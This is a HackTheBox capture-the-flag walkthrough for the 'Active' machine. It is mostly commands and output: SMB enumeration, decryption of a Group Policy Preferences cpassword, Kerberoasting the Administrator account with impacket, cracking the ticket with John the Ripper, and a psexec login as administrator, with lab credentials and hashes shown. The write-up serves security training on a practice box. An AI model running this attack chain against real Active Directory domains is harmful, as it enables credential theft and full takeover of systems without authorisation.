---
layout: post
title:  "HackTheBox - Active"
categories: [HackTheBox,walkthrough]
pin: true
tags: [kerberos,smbmap,smbclient,GPPDecrypt,Ticket,JTR]
image: /images/active.jpg
---

## HackTheBox - Active

#### Port Scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -A 10.10.10.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 01:49 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.00% done; ETC: 01:49 (0:00:00 remaining)
Nmap scan report for 10.10.10.100 (10.10.10.100)
Host is up (0.37s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-07 05:51:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 54s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-07T05:52:14
|_  start_date: 2021-07-07T04:43:54

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   485.36 ms 10.10.14.1 (10.10.14.1)
2   484.74 ms 10.10.10.100 (10.10.10.100)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.27 seconds
┌──(kali㉿kali)-[~]
└─$
```

#### SMB Map

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
```

- smbclient

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.100/Replication -U ''%''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5727650 blocks available
smb: \>
```

- enumeration
- finally found the Groups.xml

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                10459647 blocks of size 4096. 5727634 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>
```

- Download it

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- username : `active.htb\SVC_TGS`
- cpassword

`edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

#### Google Search

search : group policies cpassword decrypt

i found this : [abusing-group-policy-preference-files](https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/)

#### Decryption

- download the script

```bash
wget https://gist.githubusercontent.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385/raw/7b6f03f770e11fde39997696c4b218f0c6fa515e/GPPDecrypt.py
```

- install pycrypto

```bash
pip3 install pycrypto
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 GPPDecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

#### Credentials

```bash
SVC_TGS:GPPstillStandingStrong2k18
```

#### SMB Map again

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```

#### SMB Client

```bash
smbclient //10.10.10.100/Users -U 'SVC_TGS'%'GPPstillStandingStrong2k18'
```

#### User Owned

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.10.10.100/Users -U 'SVC_TGS'%'GPPstillStandingStrong2k18'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
```

#### WAD COMS

wadcoms is very usefull website to help you go further based on the info we have

![image]( /assets/img/active/1.PNG)

- [Wadcoms - github.io](https://wadcoms.github.io/)

- some choices are below

![image]( /assets/img/active/2.PNG)

i will try

```
python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

the link below explains each impacket script

[Secure Auth - impacket](https://www.secureauth.com/labs/open-source-tools/impacket/)

![image]( /assets/img/active/3.PNG)

#### Administrator Ticket

```bash
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ee3634a0366f0343e9ab7db5ac78a33f$b3e62446389a0ebebf8626754de5489dac2507d0ba818e3f5952568099cc9afd8fc5bc93d740a6b96f01869a0f36b21c4d6acd77944d030ded08cf9cd5e499264332f5df6220275ea596a111d473a02fba7b83d5b83876f7018a44d9df8453327b0aba87135a7395ffb0b7b7cf58bfadd4b4c86bf8678c5a8df4bfebf00481a071027c97f491f96cd235263ab92648fb4c4cfae65e4618f913258535409601e5f572101bc2d7a82e3d4a0c5d97e82268b0b4f1257196b20fc30b9a0bb9cf5fd5067d0e92fb33774e21cabd5b9da460a92a6b4eb405c59046be3e2e00c557911553a25d36a4af15ce61ac40e1ca2b0cae229594fc054b77d14a8811963863740d0853e69cccfdc1a41f15afd387e6d985c81d753d1bd5773ff0ef0e6bccb4a18e090597130fee1ef9795149f6888f9ea72b61c8517374e99b28e293cd59cb2dab6a9f6c0b2316b854bf66e950f098ea319213e7d88e9cdeeda1424a1b39cc40babfa8b7460a064ae05d64c8ff5d2ae776b1aefe00dca0384cc3ae77c3c8e29446c7b1e03932bdb130e87f7101b066db0d29e8891591baae8b8a6e54dbad640c86db23699b1e98b454dc8bf95163289eb73b1885f61812ed93edeb9e16b924c7ad004f2551ca7e8ef631ee1ba350062d2848ff466ad964f5e5cfc9ec1015686738dd2aaabfb040208fc77511af576f9efcb9fe73b1cf1210f6c331ead64144e01f56a249f9a0017237cb498ecff94f38aa32110eb10a5ab881d24791a7adbeec421f521a5e3c36b43df8d7d2fc6d9e3db6407c631e685cd671e1cb30e59adf71da66e86a82eaa4730b0bc609bba2d2a645fe9306ed41514dc90e2e6a1e1ccce6ccfc6a81f7ee2760707afab2b7d0cb85ec45249a13b399cee9ebfa984e1e016a1bb690382237a493913e8d06d690d2ee428ee57a59f2135412017e350b31076af3042d08b3b19e539eadbafd56088a4dd6bb01ca35d4baf1b56f81bbb151cb2dbc6698ffa7097c6289587d2354fec4719c7524eba1b576df51b9147f35b5741fe55b01b7a2c7f68e933662565bf48c2d0bf593e3172aac1c2e283484c18cfe66d2b09f7069338d93e043ceb832454881f2668ba9b49fa545a68cc7edb5753e85782b99e4a829c4a63fbb722e6c1e7f8ff0edc5f03e87fc9342d9ba31e0c29b133df2c41bc44d51621e19526d58c1ffcd812f389656b2136ea8fdae1d29a87ef03143ebbaab8d02da9703fc2ff5f2fddf33fffaed06cbb455734e0d
```

#### Crack using JTR

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ john admin-ticket.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:13 DONE (2021-07-07 05:44) 0.07639g/s 805001p/s 805001c/s 805001C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
```

#### Administrator Credentials

```bash
administrator:Ticketmaster1968
```

#### Rooted

```bash
python3 psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```

- in action

![image]( /assets/img/active/4.PNG)
